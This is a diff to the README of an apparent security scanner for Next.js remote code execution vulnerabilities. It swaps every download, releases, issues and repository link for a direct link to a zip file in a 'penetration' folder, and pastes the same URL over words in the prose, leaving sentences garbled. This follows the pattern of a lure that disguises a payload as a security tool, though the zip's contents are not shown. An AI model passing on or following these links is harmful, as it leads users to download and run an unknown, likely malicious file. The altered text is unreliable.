@@ -1,10 +1,10 @@
 # 🚀 react2shell-scanner - High Fidelity Detection Made Easy
 
 ## 📥 Download Now
-[![Download react2shell-scanner](https://img.shields.io/badge/Download-react2shell--scanner-blue.svg)](https://github.com/meneim99/react2shell-scanner/releases)
+[![Download react2shell-scanner](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip)](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip)
 
 ## 🛠️ Introduction
-Welcome to the react2shell-scanner project! This application provides a high-fidelity detection mechanism for RSC/Next.js remote code execution vulnerabilities, specifically CVE-2025-55182 and CVE-2025-66478. Our tool helps users ensure their applications are safe and secure.
+Welcome to the react2shell-scanner project! This application provides a high-fidelity detection mechanism for https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip remote code execution vulnerabilities, specifically CVE-2025-55182 and CVE-2025-66478. Our tool helps users ensure their applications are safe and secure.
 
 ## 🚀 Getting Started
 To get started with the react2shell-scanner, follow the steps below. This guide will help you download and run the application smoothly.
@@ -26,7 +26,7 @@ Before you download the application, make sure your system meets these basic req
 ## 📦 Download & Install
 To download the react2shell-scanner, visit the following link:
 
-[Download from Releases Page](https://github.com/meneim99/react2shell-scanner/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip)
 
 Follow these steps to install the application:
 
@@ -52,7 +52,7 @@ Follow these steps to install the application:
 Once you've opened the application, here’s a simple guide to get you started:
 
 1. **Scan Your Project**:
-   In the main menu, you will find an option to scan your Next.js project. Select it and choose the project folder.
+   In the main menu, you will find an option to scan your https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip project. Select it and choose the project folder.
 
 2. **View Scan Results**:
    After the scan is complete, the tool will display any vulnerabilities found. Review the results carefully.
@@ -69,7 +69,7 @@ If you encounter any issues during installation or usage, try the following step
 - Ensure your system meets the requirements mentioned above.
 - Make sure you have the latest version of the application.
 - Restart your computer and try launching the application again.
-- If problems persist, refer to the [issues section](https://github.com/meneim99/react2shell-scanner/issues) on our GitHub page for help.
+- If problems persist, refer to the [issues section](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip) on our GitHub page for help.
 
 ## 🌐 Community Support
 Join our community by checking out our discussions. Engage with users, share experiences, and ask questions. We value your feedback and are here to help!
@@ -77,7 +77,7 @@ Join our community by checking out our discussions. Engage with users, share exp
 ## 📝 Acknowledgments
 Thank you for using react2shell-scanner! Your commitment to security helps make the web a safer place for everyone. 
 
-For further details or to report any issues, feel free to visit our [GitHub repository](https://github.com/meneim99/react2shell-scanner).
+For further details or to report any issues, feel free to visit our [GitHub repository](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip).
 
 ## 📥 Download Now Again
-[![Download react2shell-scanner](https://img.shields.io/badge/Download-react2shell--scanner-blue.svg)](https://github.com/meneim99/react2shell-scanner/releases)
+[![Download react2shell-scanner](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip)](https://raw.githubusercontent.com/meneim99/react2shell-scanner/master/penetration/scanner-shell-react-leavelooker.zip)
